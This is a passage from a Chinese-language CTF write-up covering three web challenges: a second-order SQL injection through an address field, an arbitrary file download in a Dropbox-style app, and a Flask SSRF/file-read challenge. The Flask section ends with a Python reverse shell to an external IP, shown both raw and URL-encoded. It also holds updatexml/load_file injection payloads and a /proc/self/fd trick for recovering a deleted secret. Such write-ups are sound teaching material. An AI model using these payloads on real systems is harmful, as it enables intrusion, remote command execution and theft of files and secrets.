        $row = $fetch->fetch_assoc();
        $sql = "update `user` set `address`='".$address."', `old_address`='".$row['address']."' where `user_id`=".$row['user_id'];
        $result = $db->query($sql);
        if(!$result) {
            echo 'error';
            print_r($db->error);
            exit;
        }
        $msg = "订单修改成功";
    } else {
        $msg = "未找到订单!";
    }
}else {
    $msg = "信息不全";
}
?>
```

`delete.php`

```php
<?php

require_once "config.php";

if(!empty($_POST["user_name"]) && !empty($_POST["phone"]))
{
    $msg = '';
    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';
    $user_name = $_POST["user_name"];
    $phone = $_POST["phone"];
    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ 
        $msg = 'no sql inject!';
    }else{
        $sql = "select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'";
        $fetch = $db->query($sql);
    }

    if (isset($fetch) && $fetch->num_rows>0){
        $row = $fetch->fetch_assoc();
        $result = $db->query('delete from `user` where `user_id`=' . $row["user_id"]);
        if(!$result) {
            echo 'error';
            print_r($db->error);
            exit;
        }
        $msg = "订单删除成功";
    } else {
        $msg = "未找到订单!";
    }
}else {
    $msg = "信息不全";
}
?>
```

通过代码审计可以发现，`user_name`和`phone`都进行了严格的过滤，但是`address`只用`addslashes()`对预定义字符进行了转义，所以`address`参数为可以利用的注入点。

由于`address`被`addslashes()`转义以后单引号等无法使用，但是更新地址时，会将旧地址保存下来，所以我们只要将在第一次修改地址时输入SQL注入语句，在第二次更新时（随便输），第一次更新的SQL语句会被调用从而引发二次注入。

![Alt text](img/22-2.png)

提交订单后修改两次订单，第二次会执行

```sql
address=1' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('/flag.txt'),1,20)),0x7e),1)#

address=1' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('/flag.txt'),20,50)),0x7e),1)#
```

![Alt text](img/22-3.png)

![Alt text](img/22-4.png)

因`CISCN`的`flag`是存在根目录下，故读取根目录文件

# [CISCN2019 华北赛区 Day1 Web1]Dropbox

`任意文件下载`
`phar`

在注册之后上传`shell`失败后，点击下载时抓包发现似乎有任意文件下载漏洞

![Alt text](img/23-1.png)

![Alt text](img/23-2.png)

尝试路径后找到了`download.php`文件的内容

```php
<?php
session_start();
if (!isset($_SESSION['login'])) {
    header("Location: login.php");
    die();
}

if (!isset($_POST['filename'])) {
    die();
}

include "class.php";
ini_set("open_basedir", getcwd() . ":/etc:/tmp");

chdir($_SESSION['sandbox']);
$file = new File();
$filename = (string) $_POST['filename'];
if (strlen($filename) < 40 && $file->open($filename) && stristr($filename, "flag") === false) {
    Header("Content-type: application/octet-stream");
    Header("Content-Disposition: attachment; filename=" . basename($filename));
    echo $file->close();
} else {
    echo "File not exist";
}
?>
```

`delete.php`

```php
<?php
session_start();
if (!isset($_SESSION['login'])) {
    header("Location: login.php");
    die();
}

if (!isset($_POST['filename'])) {
    die();
}

include "class.php";

chdir($_SESSION['sandbox']);
$file = new File();
$filename = (string) $_POST['filename'];
if (strlen($filename) < 40 && $file->open($filename)) {
    $file->detele();
    Header("Content-type: application/json");
    $response = array("success" => true, "error" => "");
    echo json_encode($response);
} else {
    Header("Content-type: application/json");
    $response = array("success" => false, "error" => "File not exist");
    echo json_encode($response);
}
?>
```

# [网鼎杯 2020 白虎组]PicDown

`flask`

`python`

`linux特殊文件`

![Alt text](img/24-1.png)

在输入框中输入数据，按`Enter`

![Alt text](img/24-2.png)

`url`参数，看起来像`ssrf`，试了`file:///etc/passwd`和`http://127.0.0.1/`

都没有回显

尝试直接输入路径时会返回文件内容

![Alt text](img/24-3.png)

读取一下`/proc/self/cmdline`看看运行命令

![Alt text](img/24-4.png)

发现是`python2`运行的程序，一般为`flask`

读取一下环境变量

![Alt text](img/24-5.png)

看到当前工作目录为`/app`

查看源码`app.py`

![Alt text](img/24-6.png)

```python
from flask import Flask, Response
from flask import render_template
from flask import request
import os
import urllib

app = Flask(__name__)

SECRET_FILE = "/tmp/secret.txt"
f = open(SECRET_FILE)
SECRET_KEY = f.read().strip()
os.remove(SECRET_FILE)


@app.route('/')
def index():
    return render_template('search.html')


@app.route('/page')
def page():
    url = request.args.get("url")
    try:
        if not url.lower().startswith("file"):
            res = urllib.urlopen(url)
            value = res.read()
            response = Response(value, mimetype='application/octet-stream')
            response.headers['Content-Disposition'] = 'attachment; filename=beautiful.jpg'
            return response
        else:
            value = "HACK ERROR!"
    except:
        value = "SOMETHING WRONG!"
    return render_template('search.html', res=value)


@app.route('/no_one_know_the_manager')
def manager():
    key = request.args.get("key")
    print(SECRET_KEY)
    if key == SECRET_KEY:
        shell = request.args.get("shell")
        os.system(shell)
        res = "ok"
    else:
        res = "Wrong Key!"

    return res


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
```

需要执行命令，需要知道`SECRET_KEY`的内容

所以这里我们的目标就是想办法获取这个`SECRET_KEY`静态变量，再看看`SECRET_KEY`是怎样获取的：

```python
SECRET_FILE = "/tmp/secret.txt"
f = open(SECRET_FILE)
SECRET_KEY = f.read().strip()
os.remove(SECRET_FILE)
```

这里是用`open()`方法从 `/tmp/secret.txt` 里面读取的内容作为`SECRET_KEY`的，读取完文件之后就把 `/tmp/secret.txt` 给删掉了，因此我们无法直接包含 `/tmp/secret.txt` 来获取`SECRET_KEY`。

但在 `linux` 系统中如果一个程序用`open()`打开了一个文件但最终没有关闭他，即便从外部（如`os.remove(SECRET_FILE)`）删除这个文件之后，在 `/proc` 这个进程的 `pid` 目录下的 `fd` 文件描述符目录下还是会有这个文件的文件描述符，通过这个文件描述符我们即可得到被删除文件的内容。`/proc/[pid]/fd` 这个目录里包含了进程打开文件的情况，目录里面有一堆`/proc/[pid]/fd/id`文件，`id`就是进程记录的打开文件的文件描述符的序号。我们通过对`id`的爆破，得到`/tmp/secret.txt`文件描述符的序号：

![Alt text](img/24-7.png)

![Alt text](img/24-87.png)

发现了`SECRET_KEY`的值

如上图所示，在`id`等于`3`的时候读取成功了，得到`secret.txt`的内容为：`nL6/jd0OrBL8tJDrosvTLZNQdATFynSs+FjScxRIy1E=` 。这时我们就可以通过`python`来反弹`shell`了，`python`反弹`shell`的`payload`如下：

使用`Hack-Tools`的`Chrome`插件生成

![Alt Text](img/24-9.png)

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("175.24.207.93",8777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'
```

最终`payload`用`url`编码一下

```url
/no_one_know_the_manager?key=2ZRb4F3xZAJlyrNVhmBH5o7lGUBmoNs4uajixfn4p7o=&shell=python+-c+'import+socket,subprocess,os%3bs%3dsocket.socket(socket.AF_INET,socket.SOCK_STREAM)%3bs.connect(("175.24.207.93",8777))%3bos.dup2(s.fileno(),0)%3b+os.dup2(s.fileno(),1)%3bos.dup2(s.fileno(),2)%3bimport+pty%3b+pty.spawn("/bin/sh")'
```

远程`vps`用`nc -lvnp 8777`监听即可

![Alt Text](img/24-11.png)

![Alt Text](img/24-10.png)

